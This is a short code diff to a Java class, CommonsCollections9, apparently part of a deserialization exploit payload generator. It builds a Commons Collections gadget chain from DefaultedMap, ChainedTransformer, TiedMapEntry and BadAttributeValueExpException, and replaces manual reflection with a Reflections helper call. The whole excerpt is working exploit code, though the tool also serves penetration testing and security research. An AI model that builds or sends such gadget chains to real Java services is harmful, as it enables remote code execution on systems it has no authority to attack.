@@ -27,9 +27,7 @@ public class CommonsCollections9 implements ObjectPayload<BadAttributeValueExpEx
 		Map                           defaultedmap       = DefaultedMap.decorate(innerMap, (Transformer) chainedTransformer);
 		TiedMapEntry                  entry              = new TiedMapEntry(defaultedmap, "su18");
 		BadAttributeValueExpException val                = new BadAttributeValueExpException(null);
-		Field                         valfield           = val.getClass().getDeclaredField("val");
-		valfield.setAccessible(true);
-		valfield.set(val, entry);
+		Reflections.setFieldValue(val, "val", entry);
 		Reflections.setFieldValue(chainedTransformer, "iTransformers", transformers);
 		return val;
 	}
